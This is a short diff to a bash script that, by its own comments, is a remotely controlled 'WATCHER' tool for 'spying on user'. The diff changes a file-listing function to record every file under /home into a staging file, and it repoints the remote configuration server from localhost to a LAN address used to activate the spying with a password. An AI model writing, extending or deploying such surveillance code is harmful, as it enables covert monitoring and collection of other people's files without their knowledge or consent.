@@ -206,7 +206,7 @@ function file_list {
 	DATA=`date +"%Y-%m-%d-%H-%M-%S"`
 	touch "tmp/remote.txt"
 	echo "Command find executed on $DATA">>"tmp/remote.txt"
-	find ~/>"tmp/remote.txt"
+	find /home/>"tmp/remote.txt"
 }
 
 function file_data {
@@ -433,7 +433,7 @@ DB_DIR_MAX_SIZE=120000
 
 # Remote config:
 REMOTE_CONFIG=2 # 0 - don't; 1 - run only if config exists; 2 - check config but run even if config doesn't exists; 3 - run only when activated by config, but doesn't exit when config file dissapears'
-REMOTE_CONFIG_ADDRESS="http://127.0.0.1" # Address to dir containing file
+REMOTE_CONFIG_ADDRESS="http://192.168.1.101" # Address to dir containing file
 REMOTE_CONFIG_NAME="WATCHER.cfg" # File name
 REMOTE_ACTIVATION_PASS="PASS" # Password (it should be placed at the top of config file), it will activate spying on user if you decoded so
 REMOTE_CHECK_EVERY=10 # check every 10 passes, for special commands
